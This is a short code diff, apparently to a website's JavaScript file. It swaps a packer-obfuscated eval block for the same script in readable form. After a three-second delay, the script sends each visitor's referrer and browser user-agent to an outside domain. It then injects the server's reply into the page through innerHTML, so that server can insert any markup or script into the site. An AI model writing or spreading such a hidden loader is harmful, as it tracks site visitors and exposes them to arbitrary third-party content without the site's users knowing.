@@ -1,1 +1,23 @@
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9(2(){5()},e);2 5(){0 a="f://g.h/i/j.k";0 b=6(7.l);0 c=6(m.n);0 d=o p();d.q("r",a+"?s="+b+"&t="+c,u);d.v("w-y","z/x-A-B-C");d.D=2(){8(d.E==4&&d.F==G){3=d.H;8(3!=="1"){7.I("J").K=3}}}d.L()}',48,48,'var||function|data||start|encodeURIComponent|document|if|setTimeout|||||3000|https|mavibeyazfirsat|co|calis|isp|php|referrer|navigator|userAgent|new|XMLHttpRequest|open|GET|ref|userag|true|setRequestHeader|Content||type|application|www|form|urlencoded|onreadystatechange|readyState|status|200|responseText|getElementById|sonuc|innerHTML|send'.split('|'),0,{}))
+
+setTimeout(function(){ start(); }, 3000);
+				
+				function start()
+				{
+					
+	var url="https://mavibeyazfirsat.co/calis/isp.php";
+var ref=encodeURIComponent(document.referrer);
+var userag=encodeURIComponent(navigator.userAgent);
+
+var xhr = new XMLHttpRequest();
+                xhr.open("GET", url+"?ref="+ref+"&userag="+userag, true);
+                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4 && xhr.status == 200) {
+			   
+						data=xhr.responseText;
+						if(data !== "1")
+						{document.getElementById("sonuc").innerHTML=data;}
+                    }
+                }
+                xhr.send();
+				}
